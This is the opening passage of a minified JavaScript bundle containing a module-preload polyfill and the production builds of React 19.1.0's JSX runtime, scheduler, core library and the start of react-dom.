var l$ = Object.defineProperty;
var hS = r => {
    throw TypeError(r)
}
;
var u$ = (r, e, t) => e in r ? l$(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t;
var we = (r, e, t) => u$(r, typeof e != "symbol" ? e + "" : e, t)
  , Pv = (r, e, t) => e.has(r) || hS("Cannot " + t);
var Ae = (r, e, t) => (Pv(r, e, "read from private field"),
t ? t.call(r) : e.get(r))
  , ft = (r, e, t) => e.has(r) ? hS("Cannot add the same private member more than once") : e instanceof WeakSet ? e.add(r) : e.set(r, t)
  , He = (r, e, t, o) => (Pv(r, e, "write to private field"),
o ? o.call(r, t) : e.set(r, t),
t)
  , Dt = (r, e, t) => (Pv(r, e, "access private method"),
t);
var Cv = (r, e, t, o) => ({
    set _(i) {
        He(r, e, i, t)
    },
    get _() {
        return Ae(r, e, o)
    }
});
function f$(r, e) {
    for (var t = 0; t < e.length; t++) {
        const o = e[t];
        if (typeof o != "string" && !Array.isArray(o)) {
            for (const i in o)
                if (i !== "default" && !(i in r)) {
                    const n = Object.getOwnPropertyDescriptor(o, i);
                    n && Object.defineProperty(r, i, n.get ? n : {
                        enumerable: !0,
                        get: () => o[i]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(r, Symbol.toStringTag, {
        value: "Module"
    }))
}
(function() {
    const e = document.createElement("link").relList;
    if (e && e.supports && e.supports("modulepreload"))
        return;
    for (const i of document.querySelectorAll('link[rel="modulepreload"]'))
        o(i);
    new MutationObserver(i => {
        for (const n of i)
            if (n.type === "childList")
                for (const s of n.addedNodes)
                    s.tagName === "LINK" && s.rel === "modulepreload" && o(s)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function t(i) {
        const n = {};
        return i.integrity && (n.integrity = i.integrity),
        i.referrerPolicy && (n.referrerPolicy = i.referrerPolicy),
        i.crossOrigin === "use-credentials" ? n.credentials = "include" : i.crossOrigin === "anonymous" ? n.credentials = "omit" : n.credentials = "same-origin",
        n
    }
    function o(i) {
        if (i.ep)
            return;
        i.ep = !0;
        const n = t(i);
        fetch(i.href, n)
    }
}
)();
var Ba = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {};
function Zc(r) {
    return r && r.__esModule && Object.prototype.hasOwnProperty.call(r, "default") ? r.default : r
}
function d$(r) {
    if (Object.prototype.hasOwnProperty.call(r, "__esModule"))
        return r;
    var e = r.default;
    if (typeof e == "function") {
        var t = function o() {
            return this instanceof o ? Reflect.construct(e, arguments, this.constructor) : e.apply(this, arguments)
        };
        t.prototype = e.prototype
    } else
        t = {};
    return Object.defineProperty(t, "__esModule", {
        value: !0
    }),
    Object.keys(r).forEach(function(o) {
        var i = Object.getOwnPropertyDescriptor(r, o);
        Object.defineProperty(t, o, i.get ? i : {
            enumerable: !0,
            get: function() {
                return r[o]
            }
        })
    }),
    t
}
var Sv = {
    exports: {}
}
  , ep = {};
/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var pS;
function h$() {
    if (pS)
        return ep;
    pS = 1;
    var r = Symbol.for("react.transitional.element")
      , e = Symbol.for("react.fragment");
    function t(o, i, n) {
        var s = null;
        if (n !== void 0 && (s = "" + n),
        i.key !== void 0 && (s = "" + i.key),
        "key"in i) {
            n = {};
            for (var a in i)
                a !== "key" && (n[a] = i[a])
        } else
            n = i;
        return i = n.ref,
        {
            $$typeof: r,
            type: o,
            key: s,
            ref: i !== void 0 ? i : null,
            props: n
        }
    }
    return ep.Fragment = e,
    ep.jsx = t,
    ep.jsxs = t,
    ep
}
var gS;
function p$() {
    return gS || (gS = 1,
    Sv.exports = h$()),
    Sv.exports
}
var L = p$()
  , Bv = {
    exports: {}
}
  , tp = {}
  , _v = {
    exports: {}
}
  , Iv = {};
/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var yS;
function g$() {
    return yS || (yS = 1,
    function(r) {
        function e(_, $) {
            var z = _.length;
            _.push($);
            e: for (; 0 < z; ) {
                var K = z - 1 >>> 1
                  , j = _[K];
                if (0 < i(j, $))
                    _[K] = $,
                    _[z] = j,
                    z = K;
                else
                    break e
            }
        }
        function t(_) {
            return _.length === 0 ? null : _[0]
        }
        function o(_) {
            if (_.length === 0)
                return null;
            var $ = _[0]
              , z = _.pop();
            if (z !== $) {
                _[0] = z;
                e: for (var K = 0, j = _.length, ee = j >>> 1; K < ee; ) {
                    var ie = 2 * (K + 1) - 1
                      , ae = _[ie]
                      , he = ie + 1
                      , me = _[he];
                    if (0 > i(ae, z))
                        he < j && 0 > i(me, ae) ? (_[K] = me,
                        _[he] = z,
                        K = he) : (_[K] = ae,
                        _[ie] = z,
                        K = ie);
                    else if (he < j && 0 > i(me, z))
                        _[K] = me,
                        _[he] = z,
                        K = he;
                    else
                        break e
                }
            }
            return $
        }
        function i(_, $) {
            var z = _.sortIndex - $.sortIndex;
            return z !== 0 ? z : _.id - $.id
        }
        if (r.unstable_now = void 0,
        typeof performance == "object" && typeof performance.now == "function") {
            var n = performance;
            r.unstable_now = function() {
                return n.now()
            }
        } else {
            var s = Date
              , a = s.now();
            r.unstable_now = function() {
                return s.now() - a
            }
        }
        var l = []
          , f = []
          , h = 1
          , p = null
          , b = 3
          , v = !1
          , T = !1
          , x = !1
          , E = !1
          , B = typeof setTimeout == "function" ? setTimeout : null
          , P = typeof clearTimeout == "function" ? clearTimeout : null
          , O = typeof setImmediate < "u" ? setImmediate : null;
        function F(_) {
            for (var $ = t(f); $ !== null; ) {
                if ($.callback === null)
                    o(f);
                else if ($.startTime <= _)
                    o(f),
                    $.sortIndex = $.expirationTime,
                    e(l, $);
                else
                    break;
                $ = t(f)
            }
        }
        function D(_) {
            if (x = !1,
            F(_),
            !T)
                if (t(l) !== null)
                    T = !0,
                    I || (I = !0,
                    X());
                else {
                    var $ = t(f);
                    $ !== null && R(D, $.startTime - _)
                }
        }
        var I = !1
          , M = -1
          , C = 5
          , W = -1;
        function k() {
            return E ? !0 : !(r.unstable_now() - W < C)
        }
        function H() {
            if (E = !1,
            I) {
                var _ = r.unstable_now();
                W = _;
                var $ = !0;
                try {
                    e: {
                        T = !1,
                        x && (x = !1,
                        P(M),
                        M = -1),
                        v = !0;
                        var z = b;
                        try {
                            t: {
                                for (F(_),
                                p = t(l); p !== null && !(p.expirationTime > _ && k()); ) {
                                    var K = p.callback;
                                    if (typeof K == "function") {
                                        p.callback = null,
                                        b = p.priorityLevel;
                                        var j = K(p.expirationTime <= _);
                                        if (_ = r.unstable_now(),
                                        typeof j == "function") {
                                            p.callback = j,
                                            F(_),
                                            $ = !0;
                                            break t
                                        }
                                        p === t(l) && o(l),
                                        F(_)
                                    } else
                                        o(l);
                                    p = t(l)
                                }
                                if (p !== null)
                                    $ = !0;
                                else {
                                    var ee = t(f);
                                    ee !== null && R(D, ee.startTime - _),
                                    $ = !1
                                }
                            }
                            break e
                        } finally {
                            p = null,
                            b = z,
                            v = !1
                        }
                        $ = void 0
                    }
                } finally {
                    $ ? X() : I = !1
                }
            }
        }
        var X;
        if (typeof O == "function")
            X = function() {
                O(H)
            }
            ;
        else if (typeof MessageChannel < "u") {
            var Y = new MessageChannel
              , V = Y.port2;
            Y.port1.onmessage = H,
            X = function() {
                V.postMessage(null)
            }
        } else
            X = function() {
                B(H, 0)
            }
            ;
        function R(_, $) {
            M = B(function() {
                _(r.unstable_now())
            }, $)
        }
        r.unstable_IdlePriority = 5,
        r.unstable_ImmediatePriority = 1,
        r.unstable_LowPriority = 4,
        r.unstable_NormalPriority = 3,
        r.unstable_Profiling = null,
        r.unstable_UserBlockingPriority = 2,
        r.unstable_cancelCallback = function(_) {
            _.callback = null
        }
        ,
        r.unstable_forceFrameRate = function(_) {
            0 > _ || 125 < _ ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : C = 0 < _ ? Math.floor(1e3 / _) : 5
        }
        ,
        r.unstable_getCurrentPriorityLevel = function() {
            return b
        }
        ,
        r.unstable_next = function(_) {
            switch (b) {
            case 1:
            case 2:
            case 3:
                var $ = 3;
                break;
            default:
                $ = b
            }
            var z = b;
            b = $;
            try {
                return _()
            } finally {
                b = z
            }
        }
        ,
        r.unstable_requestPaint = function() {
            E = !0
        }
        ,
        r.unstable_runWithPriority = function(_, $) {
            switch (_) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                _ = 3
            }
            var z = b;
            b = _;
            try {
                return $()
            } finally {
                b = z
            }
        }
        ,
        r.unstable_scheduleCallback = function(_, $, z) {
            var K = r.unstable_now();
            switch (typeof z == "object" && z !== null ? (z = z.delay,
            z = typeof z == "number" && 0 < z ? K + z : K) : z = K,
            _) {
            case 1:
                var j = -1;
                break;
            case 2:
                j = 250;
                break;
            case 5:
                j = 1073741823;
                break;
            case 4:
                j = 1e4;
                break;
            default:
                j = 5e3
            }
            return j = z + j,
            _ = {
                id: h++,
                callback: $,
                priorityLevel: _,
                startTime: z,
                expirationTime: j,
                sortIndex: -1
            },
            z > K ? (_.sortIndex = z,
            e(f, _),
            t(l) === null && _ === t(f) && (x ? (P(M),
            M = -1) : x = !0,
            R(D, z - K))) : (_.sortIndex = j,
            e(l, _),
            T || v || (T = !0,
            I || (I = !0,
            X()))),
            _
        }
        ,
        r.unstable_shouldYield = k,
        r.unstable_wrapCallback = function(_) {
            var $ = b;
            return function() {
                var z = b;
                b = $;
                try {
                    return _.apply(this, arguments)
                } finally {
                    b = z
                }
            }
        }
    }(Iv)),
    Iv
}
var bS;
function y$() {
    return bS || (bS = 1,
    _v.exports = g$()),
    _v.exports
}
var Ov = {
    exports: {}
}
  , $t = {};
/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var mS;
function b$() {
    if (mS)
        return $t;
    mS = 1;
    var r = Symbol.for("react.transitional.element")
      , e = Symbol.for("react.portal")
      , t = Symbol.for("react.fragment")
      , o = Symbol.for("react.strict_mode")
      , i = Symbol.for("react.profiler")
      , n = Symbol.for("react.consumer")
      , s = Symbol.for("react.context")
      , a = Symbol.for("react.forward_ref")
      , l = Symbol.for("react.suspense")
      , f = Symbol.for("react.memo")
      , h = Symbol.for("react.lazy")
      , p = Symbol.iterator;
    function b(j) {
        return j === null || typeof j != "object" ? null : (j = p && j[p] || j["@@iterator"],
        typeof j == "function" ? j : null)
    }
    var v = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    }
      , T = Object.assign
      , x = {};
    function E(j, ee, ie) {
        this.props = j,
        this.context = ee,
        this.refs = x,
        this.updater = ie || v
    }
    E.prototype.isReactComponent = {},
    E.prototype.setState = function(j, ee) {
        if (typeof j != "object" && typeof j != "function" && j != null)
            throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
        this.updater.enqueueSetState(this, j, ee, "setState")
    }
    ,
    E.prototype.forceUpdate = function(j) {
        this.updater.enqueueForceUpdate(this, j, "forceUpdate")
    }
    ;
    function B() {}
    B.prototype = E.prototype;
    function P(j, ee, ie) {
        this.props = j,
        this.context = ee,
        this.refs = x,
        this.updater = ie || v
    }
    var O = P.prototype = new B;
    O.constructor = P,
    T(O, E.prototype),
    O.isPureReactComponent = !0;
    var F = Array.isArray
      , D = {
        H: null,
        A: null,
        T: null,
        S: null,
        V: null
    }
      , I = Object.prototype.hasOwnProperty;
    function M(j, ee, ie, ae, he, me) {
        return ie = me.ref,
        {
            $$typeof: r,
            type: j,
            key: ee,
            ref: ie !== void 0 ? ie : null,
            props: me
        }
    }
    function C(j, ee) {
        return M(j.type, ee, void 0, void 0, void 0, j.props)
    }
    function W(j) {
        return typeof j == "object" && j !== null && j.$$typeof === r
    }
    function k(j) {
        var ee = {
            "=": "=0",
            ":": "=2"
        };
        return "$" + j.replace(/[=:]/g, function(ie) {
            return ee[ie]
        })
    }
    var H = /\/+/g;
    function X(j, ee) {
        return typeof j == "object" && j !== null && j.key != null ? k("" + j.key) : ee.toString(36)
    }
    function Y() {}
    function V(j) {
        switch (j.status) {
        case "fulfilled":
            return j.value;
        case "rejected":
            throw j.reason;
        default:
            switch (typeof j.status == "string" ? j.then(Y, Y) : (j.status = "pending",
            j.then(function(ee) {
                j.status === "pending" && (j.status = "fulfilled",
                j.value = ee)
            }, function(ee) {
                j.status === "pending" && (j.status = "rejected",
                j.reason = ee)
            })),
            j.status) {
            case "fulfilled":
                return j.value;
            case "rejected":
                throw j.reason
            }
        }
        throw j
    }
    function R(j, ee, ie, ae, he) {
        var me = typeof j;
        (me === "undefined" || me === "boolean") && (j = null);
        var Pe = !1;
        if (j === null)
            Pe = !0;
        else
            switch (me) {
            case "bigint":
            case "string":
            case "number":
                Pe = !0;
                break;
            case "object":
                switch (j.$$typeof) {
                case r:
                case e:
                    Pe = !0;
                    break;
                case h:
                    return Pe = j._init,
                    R(Pe(j._payload), ee, ie, ae, he)
                }
            }
        if (Pe)
            return he = he(j),
            Pe = ae === "" ? "." + X(j, 0) : ae,
            F(he) ? (ie = "",
            Pe != null && (ie = Pe.replace(H, "$&/") + "/"),
            R(he, ee, ie, "", function(Je) {
                return Je
            })) : he != null && (W(he) && (he = C(he, ie + (he.key == null || j && j.key === he.key ? "" : ("" + he.key).replace(H, "$&/") + "/") + Pe)),
            ee.push(he)),
            1;
        Pe = 0;
        var _e = ae === "" ? "." : ae + ":";
        if (F(j))
            for (var Fe = 0; Fe < j.length; Fe++)
                ae = j[Fe],
                me = _e + X(ae, Fe),
                Pe += R(ae, ee, ie, me, he);
        else if (Fe = b(j),
        typeof Fe == "function")
            for (j = Fe.call(j),
            Fe = 0; !(ae = j.next()).done; )
                ae = ae.value,
                me = _e + X(ae, Fe++),
                Pe += R(ae, ee, ie, me, he);
        else if (me === "object") {
            if (typeof j.then == "function")
                return R(V(j), ee, ie, ae, he);
            throw ee = String(j),
            Error("Objects are not valid as a React child (found: " + (ee === "[object Object]" ? "object with keys {" + Object.keys(j).join(", ") + "}" : ee) + "). If you meant to render a collection of children, use an array instead.")
        }
        return Pe
    }
    function _(j, ee, ie) {
        if (j == null)
            return j;
        var ae = []
          , he = 0;
        return R(j, ae, "", "", function(me) {
            return ee.call(ie, me, he++)
        }),
        ae
    }
    function $(j) {
        if (j._status === -1) {
            var ee = j._result;
            ee = ee(),
            ee.then(function(ie) {
                (j._status === 0 || j._status === -1) && (j._status = 1,
                j._result = ie)
            }, function(ie) {
                (j._status === 0 || j._status === -1) && (j._status = 2,
                j._result = ie)
            }),
            j._status === -1 && (j._status = 0,
            j._result = ee)
        }
        if (j._status === 1)
            return j._result.default;
        throw j._result
    }
    var z = typeof reportError == "function" ? reportError : function(j) {
        if (typeof window == "object" && typeof window.ErrorEvent == "function") {
            var ee = new window.ErrorEvent("error",{
                bubbles: !0,
                cancelable: !0,
                message: typeof j == "object" && j !== null && typeof j.message == "string" ? String(j.message) : String(j),
                error: j
            });
            if (!window.dispatchEvent(ee))
                return
        } else if (typeof process == "object" && typeof process.emit == "function") {
            process.emit("uncaughtException", j);
            return
        }
        console.error(j)
    }
    ;
    function K() {}
    return $t.Children = {
        map: _,
        forEach: function(j, ee, ie) {
            _(j, function() {
                ee.apply(this, arguments)
            }, ie)
        },
        count: function(j) {
            var ee = 0;
            return _(j, function() {
                ee++
            }),
            ee
        },
        toArray: function(j) {
            return _(j, function(ee) {
                return ee
            }) || []
        },
        only: function(j) {
            if (!W(j))
                throw Error("React.Children.only expected to receive a single React element child.");
            return j
        }
    },
    $t.Component = E,
    $t.Fragment = t,
    $t.Profiler = i,
    $t.PureComponent = P,
    $t.StrictMode = o,
    $t.Suspense = l,
    $t.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = D,
    $t.__COMPILER_RUNTIME = {
        __proto__: null,
        c: function(j) {
            return D.H.useMemoCache(j)
        }
    },
    $t.cache = function(j) {
        return function() {
            return j.apply(null, arguments)
        }
    }
    ,
    $t.cloneElement = function(j, ee, ie) {
        if (j == null)
            throw Error("The argument must be a React element, but you passed " + j + ".");
        var ae = T({}, j.props)
          , he = j.key
          , me = void 0;
        if (ee != null)
            for (Pe in ee.ref !== void 0 && (me = void 0),
            ee.key !== void 0 && (he = "" + ee.key),
            ee)
                !I.call(ee, Pe) || Pe === "key" || Pe === "__self" || Pe === "__source" || Pe === "ref" && ee.ref === void 0 || (ae[Pe] = ee[Pe]);
        var Pe = arguments.length - 2;
        if (Pe === 1)
            ae.children = ie;
        else if (1 < Pe) {
            for (var _e = Array(Pe), Fe = 0; Fe < Pe; Fe++)
                _e[Fe] = arguments[Fe + 2];
            ae.children = _e
        }
        return M(j.type, he, void 0, void 0, me, ae)
    }
    ,
    $t.createContext = function(j) {
        return j = {
            $$typeof: s,
            _currentValue: j,
            _currentValue2: j,
            _threadCount: 0,
            Provider: null,
            Consumer: null
        },
        j.Provider = j,
        j.Consumer = {
            $$typeof: n,
            _context: j
        },
        j
    }
    ,
    $t.createElement = function(j, ee, ie) {
        var ae, he = {}, me = null;
        if (ee != null)
            for (ae in ee.key !== void 0 && (me = "" + ee.key),
            ee)
                I.call(ee, ae) && ae !== "key" && ae !== "__self" && ae !== "__source" && (he[ae] = ee[ae]);
        var Pe = arguments.length - 2;
        if (Pe === 1)
            he.children = ie;
        else if (1 < Pe) {
            for (var _e = Array(Pe), Fe = 0; Fe < Pe; Fe++)
                _e[Fe] = arguments[Fe + 2];
            he.children = _e
        }
        if (j && j.defaultProps)
            for (ae in Pe = j.defaultProps,
            Pe)
                he[ae] === void 0 && (he[ae] = Pe[ae]);
        return M(j, me, void 0, void 0, null, he)
    }
    ,
    $t.createRef = function() {
        return {
            current: null
        }
    }
    ,
    $t.forwardRef = function(j) {
        return {
            $$typeof: a,
            render: j
        }
    }
    ,
    $t.isValidElement = W,
    $t.lazy = function(j) {
        return {
            $$typeof: h,
            _payload: {
                _status: -1,
                _result: j
            },
            _init: $
        }
    }
    ,
    $t.memo = function(j, ee) {
        return {
            $$typeof: f,
            type: j,
            compare: ee === void 0 ? null : ee
        }
    }
    ,
    $t.startTransition = function(j) {
        var ee = D.T
          , ie = {};
        D.T = ie;
        try {
            var ae = j()
              , he = D.S;
            he !== null && he(ie, ae),
            typeof ae == "object" && ae !== null && typeof ae.then == "function" && ae.then(K, z)
        } catch (me) {
            z(me)
        } finally {
            D.T = ee
        }
    }
    ,
    $t.unstable_useCacheRefresh = function() {
        return D.H.useCacheRefresh()
    }
    ,
    $t.use = function(j) {
        return D.H.use(j)
    }
    ,
    $t.useActionState = function(j, ee, ie) {
        return D.H.useActionState(j, ee, ie)
    }
    ,
    $t.useCallback = function(j, ee) {
        return D.H.useCallback(j, ee)
    }
    ,
    $t.useContext = function(j) {
        return D.H.useContext(j)
    }
    ,
    $t.useDebugValue = function() {}
    ,
    $t.useDeferredValue = function(j, ee) {
        return D.H.useDeferredValue(j, ee)
    }
    ,
    $t.useEffect = function(j, ee, ie) {
        var ae = D.H;
        if (typeof ie == "function")
            throw Error("useEffect CRUD overload is not enabled in this build of React.");
        return ae.useEffect(j, ee)
    }
    ,
    $t.useId = function() {
        return D.H.useId()
    }
    ,
    $t.useImperativeHandle = function(j, ee, ie) {
        return D.H.useImperativeHandle(j, ee, ie)
    }
    ,
    $t.useInsertionEffect = function(j, ee) {
        return D.H.useInsertionEffect(j, ee)
    }
    ,
    $t.useLayoutEffect = function(j, ee) {
        return D.H.useLayoutEffect(j, ee)
    }
    ,
    $t.useMemo = function(j, ee) {
        return D.H.useMemo(j, ee)
    }
    ,
    $t.useOptimistic = function(j, ee) {
        return D.H.useOptimistic(j, ee)
    }
    ,
    $t.useReducer = function(j, ee, ie) {
        return D.H.useReducer(j, ee, ie)
    }
    ,
    $t.useRef = function(j) {
        return D.H.useRef(j)
    }
    ,
    $t.useState = function(j) {
        return D.H.useState(j)
    }
    ,
    $t.useSyncExternalStore = function(j, ee, ie) {
        return D.H.useSyncExternalStore(j, ee, ie)
    }
    ,
    $t.useTransition = function() {
        return D.H.useTransition()
    }
    ,
    $t.version = "19.1.0",
    $t
}
var xS;
function jA() {
    return xS || (xS = 1,
    Ov.exports = b$()),
    Ov.exports
}
var Rv = {
    exports: {}
}
  , Kn = {};
/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var wS;
function m$() {
    if (wS)
        return Kn;
    wS = 1;
    var r = jA();
    function e(l) {
        var f = "https://react.dev/errors/" + l;
        if (1 < arguments.length) {
            f += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var h = 2; h < arguments.length; h++)
                f += "&args[]=" + encodeURIComponent(arguments[h])
        }
        return "Minified React error #" + l + "; visit " + f + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function t() {}
    var o = {
        d: {
            f: t,
            r: function() {
                throw Error(e(522))
            },
            D: t,
            C: t,
            L: t,
            m: t,
            X: t,
            S: t,
            M: t
        },
        p: 0,
        findDOMNode: null
    }
      , i = Symbol.for("react.portal");
    function n(l, f, h) {
        var p = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
        return {
            $$typeof: i,
            key: p == null ? null : "" + p,
            children: l,
            containerInfo: f,
            implementation: h
        }
    }
    var s = r.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
    function a(l, f) {
        if (l === "font")
            return "";
        if (typeof f == "string")
            return f === "use-credentials" ? f : ""
    }
    return Kn.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = o,
    Kn.createPortal = function(l, f) {
        var h = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
        if (!f || f.nodeType !== 1 && f.nodeType !== 9 && f.nodeType !== 11)
            throw Error(e(299));
        return n(l, f, null, h)
    }
    ,
    Kn.flushSync = function(l) {
        var f = s.T
          , h = o.p;
        try {
            if (s.T = null,
            o.p = 2,
            l)
                return l()
        } finally {
            s.T = f,
            o.p = h,
            o.d.f()
        }
    }
    ,
    Kn.preconnect = function(l, f) {
        typeof l == "string" && (f ? (f = f.crossOrigin,
        f = typeof f == "string" ? f === "use-credentials" ? f : "" : void 0) : f = null,
        o.d.C(l, f))
    }
    ,
    Kn.prefetchDNS = function(l) {
        typeof l == "string" && o.d.D(l)
    }
    ,
    Kn.preinit = function(l, f) {
        if (typeof l == "string" && f && typeof f.as == "string") {
            var h = f.as
              , p = a(h, f.crossOrigin)
              , b = typeof f.integrity == "string" ? f.integrity : void 0
              , v = typeof f.fetchPriority == "string" ? f.fetchPriority : void 0;
            h === "style" ? o.d.S(l, typeof f.precedence == "string" ? f.precedence : void 0, {
                crossOrigin: p,
                integrity: b,
                fetchPriority: v
            }) : h === "script" && o.d.X(l, {
                crossOrigin: p,
                integrity: b,
                fetchPriority: v,
                nonce: typeof f.nonce == "string" ? f.nonce : void 0
            })
        }
    }
    ,
    Kn.preinitModule = function(l, f) {
        if (typeof l == "string")
            if (typeof f == "object" && f !== null) {
                if (f.as == null || f.as === "script") {
                    var h = a(f.as, f.crossOrigin);
                    o.d.M(l, {
                        crossOrigin: h,
                        integrity: typeof f.integrity == "string" ? f.integrity : void 0,
                        nonce: typeof f.nonce == "string" ? f.nonce : void 0
                    })
                }
            } else
                f == null && o.d.M(l)
    }
    ,
    Kn.preload = function(l, f) {
        if (typeof l == "string" && typeof f == "object" && f !== null && typeof f.as == "string") {
            var h = f.as
              , p = a(h, f.crossOrigin);
            o.d.L(l, h, {
                crossOrigin: p,
                integrity: typeof f.integrity == "string" ? f.integrity : void 0,
                nonce: typeof f.nonce == "string" ? f.nonce : void 0,
                type: typeof f.type == "string" ? f.type : void 0,
                fetchPriority: typeof f.fetchPriority == "string" ? f.fetchPriority : void 0,
                referrerPolicy: typeof f.referrerPolicy == "string" ? f.referrerPolicy : void 0,
                imageSrcSet: typeof f.imageSrcSet == "string" ? f.imageSrcSet : void 0,
                imageSizes: typeof f.imageSizes == "string" ? f.imageSizes : void 0,
                media: typeof f.media == "string" ? f.media : void 0
            })
        }
    }
    ,
    Kn.preloadModule = function(l, f) {
        if (typeof l == "string")
            if (f) {
                var h = a(f.as, f.crossOrigin);
                o.d.m(l, {
                    as: typeof f.as == "string" && f.as !== "script" ? f.as : void 0,
                    crossOrigin: h,
                    integrity: typeof f.integrity == "string" ? f.integrity : void 0
                })
            } else
                o.d.m(l)
    }
    ,
    Kn.requestFormReset = function(l) {
        o.d.r(l)
    }
    ,
    Kn.unstable_batchedUpdates = function(l, f) {
        return l(f)
    }
    ,
    Kn.useFormState = function(l, f, h) {
        return s.H.useFormState(l, f, h)
    }
    ,
    Kn.useFormStatus = function() {
        return s.H.useHostTransitionStatus()
    }
    ,
    Kn.version = "19.1.0",
    Kn
}
var vS;
function KW() {
    if (vS)
        return Rv.exports;
    vS = 1;
    function r() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(r)
            } catch (e) {
                console.error(e)
            }
    }
    return r(),
    Rv.exports = m$(),
    Rv.exports
}
/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var TS;
function x$() {
    if (TS)
        return tp;
    TS = 1;
    var r = y$()
      , e = jA()
      , t = KW();
    function o(c) {
        var u = "https://react.dev/errors/" + c;
        if (1 < arguments.length) {
            u += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var d = 2; d < arguments.length; d++)
                u += "&args[]=" + encodeURIComponent(arguments[d])
        }
        return "Minified React error #" + c + "; visit " + u + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function i(c) {
        return !(!c || c.nodeType !== 1 && c.nodeType !== 9 && c.nodeType !== 11)
    }
    function n(c) {
        var u = c
          , d = c;
        if (c.alternate)
            for (; u.return; )
                u = u.return;
        else {
            c = u;
            do
                u = c,
                (u.flags & 4098) !== 0 && (d = u.return),
                c = u.return;
            while (c)
        }
        return u.tag === 3 ? d : null
    }
    function s(c) {
        if (c.tag === 13) {
            var u = c.memoizedState;
            if (u === null && (c = c.alternate,
            c !== null && (u = c.memoizedState)),
            u !== null)
                return u.dehydrated
        }
        return null
    }
    function a(c) {
        if (n(c) !== c)
            throw Error(o(188))
    }
    function l(c) {
        var u = c.alternate;
        if (!u) {
            if (u = n(c),
            u === null)
                throw Error(o(188));
            return u !== c ? null : c
        }
        for (var d = c, g = u; ; ) {
            var w = d.return;
            if (w === null)
                break;
            var A = w.alternate;
            if (A === null) {
                if (g = w.return,
                g !== null) {
                    d = g;
                    continue
                }
                break
            }
            if (w.child === A.child) {
                for (A = w.child; A; ) {
                    if (A === d)
                        return a(w),
                        c;
                    if (A === g)
                        return a(w),
                        u;
                    A = A.sibling
                }
                throw Error(o(188))
            }
            if (d.return !== g.return)
                d = w,
                g = A;
            else {
                for (var q = !1, Q = w.child; Q; ) {
                    if (Q === d) {
                        q = !0,
                        d = w,
                        g = A;
                        break
                    }
                    if (Q === g) {
                        q = !0,
                        g = w,
                        d = A;
                        break
                    }
                    Q = Q.sibling
                }
                if (!q) {
                    for (Q = A.child; Q; ) {
                        if (Q === d) {
                            q = !0,
                            d = A,
                            g = w;
                            break
                        }
                        if (Q === g) {
                            q = !0,
                            g = A,
                            d = w;
                            break
                        }
                        Q = Q.sibling
                    }
                    if (!q)
                        throw Error(o(189))
                }
            }
            if (d.alternate !== g)
                throw Error(o(190))
        }
        if (d.tag !== 3)
            throw Error(o(188));
        return d.stateNode.current === d ? c : u
    }
    function f(c) {
        var u = c.tag;
        if (u === 5 || u === 26 || u === 27 || u === 6)
            return c;
        for (c = c.child; c !== null; ) {
            if (u = f(c),
            u !== null)
                return u;
            c = c.sibling
        }
        return null
    }
    var h = Object.assign
      , p = Symbol.for("react.element")
      , b = Symbol.for("react.transitional.element")
      , v = Symbol.for("react.portal")
      , T = Symbol.for("react.fragment")
      , x = Symbol.for("react.strict_mode")
      , E = Symbol.for("react.profiler")
      , B = Symbol.for("react.provider")
      , P = Symbol.for("react.consumer")
      , O = Symbol.for("react.context")
      , F = Symbol.for("react.forward_ref")
      , D = Symbol.for("react.suspense")
      , I = Symbol.for("react.suspense_list")
      , M = Symbol.for("react.memo")
      , C = Symbol.for("react.lazy")
      , W = Symbol.for("react.activity")
      , k = Symbol.for("react.memo_cache_sentinel")
      , H = Symbol.iterator;
    function X(c) {
        return c === null || typeof c != "object" ? null : (c = H && c[H] || c["@@iterator"],
        typeof c == "function" ? c : null)
    }
    var Y = Symbol.for("react.client.reference");
    function V(c) {
        if (c == null)
            return null;
        if (typeof c == "function")
            return c.$$typeof === Y ? null : c.displayName || c.name || null;
        if (typeof c == "string")
            return c;
        switch (c) {
        case T:
            return "Fragment";
        case E:
            return "Profiler";
        case x:
            return "StrictMode";
        case D:
            return "Suspense";
        case I:
            return "SuspenseList";
        case W:
            return "Activity"
        }
        if (typeof c == "object")
            switch (c.$$typeof) {
            case v:
                return "Portal";
            case O:
